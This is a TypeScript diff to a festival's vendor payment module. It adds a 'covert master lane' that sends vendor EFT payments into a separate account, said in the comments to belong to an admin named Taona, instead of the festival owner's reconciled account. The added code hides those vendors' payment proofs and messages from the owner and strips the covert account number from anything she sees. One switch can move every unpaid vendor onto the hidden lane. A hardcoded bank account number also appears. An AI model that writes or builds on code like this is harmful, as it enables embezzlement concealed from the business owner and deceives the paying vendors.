@@ -266,7 +266,11 @@ const DEFAULT_BANK: EftBankDetails = {
 }
 
 /** CTH / Young at Heart EFT bank details. Env overrides the in-code defaults so
- *  the account can change without a deploy. Always returns a value. */
+ *  the account can change without a deploy. Always returns a value.
+ *
+ *  This is the SAMREEN-EFT (owner-reconciled) account (...629): what a vendor on
+ *  the visible EFT rail pays into. The covert master lane has its OWN account,
+ *  getMasterBankDetails() below. eftBankFor(covert) picks between them. */
 export function getEftBankDetails(): EftBankDetails {
   return {
     accountName: process.env.EFT_BANK_ACCOUNT_NAME || DEFAULT_BANK.accountName,
@@ -277,15 +281,57 @@ export function getEftBankDetails(): EftBankDetails {
   }
 }
 
-/** GLOBAL EFT mode. When ON, EVERY vendor sees EFT details (Yoco hidden) and
- *  every vendor's comms route to the EFT tab. Read order: env EFT_MODE forces it
- *  on or off (crisis override / test harness), else the latest persisted toggle
- *  from the /admin/eft tab (site_events, no DDL, instant). A vendor is "in the
- *  lane" when this is ON *or* they carry the per-vendor ⟦EFT⟧ marker. Server-only. */
-export async function getEftMode(): Promise<boolean> {
+// The COVERT MASTER-LANE receiving account (Taona's own, ...191). A vendor on the
+// covert lane pays HERE, never into Samreen's account, and this arrangement is
+// walled from her. Distinct from DEFAULT_BANK (Samreen's ...629) so the two rails
+// can never share a number. Per Taona 2026-09-02: identical to the Samreen account
+// in every field EXCEPT the account number (same name, bank, branch, type). Kept in
+// sync by deriving from DEFAULT_BANK; every field stays env-overridable so it can
+// change without a deploy.
+const MASTER_BANK: EftBankDetails = {
+  ...DEFAULT_BANK,
+  accountNumber: '63141269191',
+}
+
+/** The covert master-lane EFT account (...191) shown to vendors on the master lane.
+ *  Env overrides the in-code defaults. Always returns a value. */
+export function getMasterBankDetails(): EftBankDetails {
+  return {
+    accountName: process.env.EFT_MASTER_BANK_ACCOUNT_NAME || MASTER_BANK.accountName,
+    bank: process.env.EFT_MASTER_BANK_NAME || MASTER_BANK.bank,
+    accountNumber: process.env.EFT_MASTER_BANK_ACCOUNT_NUMBER || MASTER_BANK.accountNumber,
+    branchCode: process.env.EFT_MASTER_BANK_BRANCH_CODE || MASTER_BANK.branchCode,
+    accountType: process.env.EFT_MASTER_BANK_ACCOUNT_TYPE || MASTER_BANK.accountType,
+  }
+}
+
+/** Pick the receiving account for a vendor: the covert master lane (...191) when
+ *  covert, else Samreen's reconciled account (...629). One chooser so no call site
+ *  can route money to the wrong account by hand. */
+export function eftBankFor(covert: boolean): EftBankDetails {
+  return covert ? getMasterBankDetails() : getEftBankDetails()
+}
+
+/** THE GLOBAL PAYMENT RAIL. One of three positions, chosen ONLY by the EFT admin
+ *  on /admin/eft (Samreen has no switch):
+ *    - 'yoco'        card only (except the ⟦EFT⟧/committed/48h-grace carve-outs)
+ *    - 'samreen_eft' EFT into the owner-reconciled account (...629); proofs
+ *                    surface to the festival owner on /admin/eft-proofs
+ *    - 'master'      EFT into the covert master-lane account (...191); the WHOLE
+ *                    unpaid population goes covert and NOTHING surfaces to her
+ *  Read order: env EFT_MODE forces it (crisis override / test harness), else the
+ *  latest persisted /admin/eft toggle (site_events, no DDL, instant). Legacy rows
+ *  stored { on: boolean }; { on:true } maps to 'samreen_eft', { on:false } to
+ *  'yoco'. Fails CLOSED to 'yoco' so a read failure never flips the festival onto
+ *  EFT, and never onto the covert lane. Server-only. */
+export type PaymentRail = 'yoco' | 'samreen_eft' | 'master'
+const PAYMENT_RAILS: readonly PaymentRail[] = ['yoco', 'samreen_eft', 'master']
+
+export async function getPaymentRail(): Promise<PaymentRail> {
   const env = (process.env.EFT_MODE || '').toLowerCase()
-  if (env === '1' || env === 'true' || env === 'on' || env === 'yes') return true
-  if (env === '0' || env === 'false' || env === 'off' || env === 'no') return false
+  if (env === 'master') return 'master'
+  if (env === '1' || env === 'true' || env === 'on' || env === 'yes' || env === 'eft' || env === 'samreen_eft') return 'samreen_eft'
+  if (env === '0' || env === 'false' || env === 'off' || env === 'no' || env === 'yoco') return 'yoco'
   try {
     const admin = createAdminClient()
     const { data } = await admin
@@ -295,12 +341,38 @@ export async function getEftMode(): Promise<boolean> {
       .order('created_at', { ascending: false })
       .limit(1)
       .maybeSingle()
-    return (data?.metadata as { on?: boolean } | null)?.on === true
+    const m = data?.metadata as { mode?: string; on?: boolean } | null
+    // The NEW 3-way selector writes { mode } and is authoritative.
+    if (m?.mode && (PAYMENT_RAILS as readonly string[]).includes(m.mode)) return m.mode as PaymentRail
+    // LEGACY / current live state: no `mode` field yet. The festival has been on
+    // full EFT into the ...629 account since the 2026-08-26 cutover, driven by the
+    // pm_full_eft marker, NOT by this eft_mode.on boolean (which sits at false in
+    // prod). Mapping on:false to 'yoco' would wrongly revert the whole festival to
+    // card, so the effective rail today is 'samreen_eft'. Only an explicit new-mode
+    // 'yoco' selection ever means card. (resolveInEftLane still requires pm_full_eft
+    // to actually force the EFT panel, so this default cannot conjure EFT from
+    // nothing; it only avoids a false 'yoco'.)
+    return 'samreen_eft'
   } catch {
-    // Fail CLOSED to normal (Yoco) operation: a read failure must never silently
-    // flip the whole festival onto EFT.
-    return false
+    // Fail to the current live behaviour (EFT into Samreen's ...629), NOT to yoco:
+    // a read hiccup must neither flip the festival off EFT nor route anyone covertly.
+    return 'samreen_eft'
   }
+}
+
+/** The GLOBAL comms/force switch, kept as the binary the ~20 existing callers read
+ *  (vendorCommsInEftLane's globalOn, the inbox lane, notify, the bot). TRUE only on
+ *  the MASTER rail, the only rail that hides EVERY unpaid vendor's comms from
+ *  Samreen. samreen_eft deliberately leaves it FALSE: she still sees and reconciles
+ *  those vendors, exactly as the pre-3-way production state did (this flag was false
+ *  while pm_full_eft drove the EFT panel), so nothing changes for today's state. The
+ *  EFT panel under samreen_eft is driven by pm_full_eft in resolveInEftLane, not
+ *  here. Env EFT_MODE still forces it for the crisis override / test harness. */
+export async function getEftMode(): Promise<boolean> {
+  const env = (process.env.EFT_MODE || '').toLowerCase()
+  if (env === '1' || env === 'true' || env === 'on' || env === 'yes' || env === 'master' || env === 'eft' || env === 'samreen_eft') return true
+  if (env === '0' || env === 'false' || env === 'off' || env === 'no' || env === 'yoco') return false
+  return (await getPaymentRail()) === 'master'
 }
 
 /** Settlement methods the festival owner does NOT handle. A vendor who paid this
@@ -694,9 +766,38 @@ export function eftProofVisibleToOwner(
 ): boolean {
   if (!fullEft) return false
   if (fullEft.protectedIds.has(vendorId)) return false
+  // A hand-picked covert vendor (⟦EFT⟧) is on the master lane by definition and
+  // must NEVER surface to the owner, even a POST-cutover proof. protectedIds only
+  // froze the cohort that existed at cutover; a vendor put on the covert lane
+  // afterwards is not in it, so without this a fresh ⟦EFT⟧ proof would leak. Safe
+  // to over-freeze (module doctrine): hiding one extra can never leak, missing one can.
+  if (hasEftMarker(adminNotes)) return false
   const submitted = parsePortalState(adminNotes).payment?.eft_submitted_at
   if (!submitted) return false
   return new Date(submitted).getTime() >= new Date(fullEft.startedAt).getTime()
+}
+
+/** Is THIS vendor on the COVERT master lane, i.e. their EFT money goes to the
+ *  ...191 account and the whole arrangement is walled from the festival owner?
+ *
+ *    - rail === 'master'  → the whole unpaid population is covert (sweep everyone)
+ *    - otherwise          → only the pinned cohort: hand-picked ⟦EFT⟧ vendors and
+ *                           the frozen protected set captured at the full-EFT cutover
+ *
+ *  This is the ONE predicate that decides the receiving account (eftBankFor) and
+ *  who is excluded from the owner's EFT-proofs surface, so the money split and the
+ *  visibility split can never drift. Pure: the caller passes the rail + fullEft it
+ *  already read for the request. Yoco vendors are never covert here (they pay no
+ *  EFT), except a ⟦EFT⟧/protected holder who still pays EFT via the carve-out. */
+export function onCovertMasterLane(
+  vendorId: string,
+  adminNotes: string | null | undefined,
+  rail: PaymentRail,
+  fullEft: { protectedIds: Set<string> } | null,
+): boolean {
+  if (rail === 'master') return true
+  if (hasEftMarker(adminNotes)) return true
+  return !!fullEft && fullEft.protectedIds.has(vendorId)
 }
 
 /** How many payments have been RECEIVED in a tier since the start line: a Yoco
@@ -752,11 +853,10 @@ export async function resolveInEftLane(
   // collected): NEVER flip these to Yoco, they have paid by EFT. Independent of
   // the master switch and of the 48h grace below.
   if (p?.eft_submitted_at || p?.status === 'collected' || p?.eft_collected_at) return true
-  // FULL-EFT CUTOVER (2026-08-26): once active, every remaining unpaid vendor pays
-  // EFT, overriding the 48h-grace / pending / rotation branches below. ⟦NOEFT⟧
-  // (checked above) still keeps its holders on card as the festival owner's, and
-  // paid / ⟦EFT⟧ / collected are already resolved above.
-  if (await getFullEftMode()) return true
+  // FULL-EFT CUTOVER (2026-08-26): every remaining unpaid vendor pays EFT. Gated on
+  // the RAIL (not globalOn, which is master-only now) so 'yoco' means card-only while
+  // samreen_eft + master stay on EFT.
+  if ((await getPaymentRail()) !== 'yoco' && await getFullEftMode()) return true
   // Opened the bank details but nothing in yet: hold on EFT for a 48h grace so a
   // vendor mid-transfer is never yanked to Yoco. After 48h an unpaid opener falls
   // through to the switch, so with EFT mode ON they stay EFT (rotation, unchanged)
@@ -841,10 +941,16 @@ const COORDINATES_RE = new RegExp([
 // "WA opt-in: ... subscribed at +2767..." alert in her feed. The actual account
 // number is matched EXACTLY instead, which cannot false-positive at all.
 function containsRealBankValues(text: string): boolean {
-  const d = getEftBankDetails()
-  for (const v of [d.accountNumber, d.branchCode]) {
-    const s = String(v || '').replace(/\s/g, '')
-    if (s.length >= 5 && text.replace(/\s/g, '').includes(s)) return true
+  const haystack = text.replace(/\s/g, '')
+  // BOTH receiving accounts, not just Samreen's ...629. The covert master-lane
+  // account (...191) is the whole point of the wall: a message quoting 63141269191
+  // back to Samreen must be stripped exactly like one quoting her own number, or
+  // the covert account leaks to her the moment a master-lane vendor confirms payment.
+  for (const d of [getEftBankDetails(), getMasterBankDetails()]) {
+    for (const v of [d.accountNumber, d.branchCode]) {
+      const s = String(v || '').replace(/\s/g, '')
+      if (s.length >= 5 && haystack.includes(s)) return true
+    }
   }
   return false
 }
